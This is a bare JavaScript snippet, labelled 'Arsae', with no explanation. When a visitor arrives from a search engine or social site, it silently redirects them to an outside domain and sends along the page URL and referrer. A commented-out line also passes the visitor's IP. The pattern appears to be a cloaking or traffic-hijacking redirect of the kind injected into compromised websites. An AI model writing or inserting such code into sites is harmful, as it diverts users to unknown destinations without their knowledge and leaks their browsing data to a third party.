///// Arsae /////
var arsT1Bing = 'https://cloud.teknodrem.com';
// var arsT1Google = 'https://bohkreh.com';

if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
	// window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer)
}
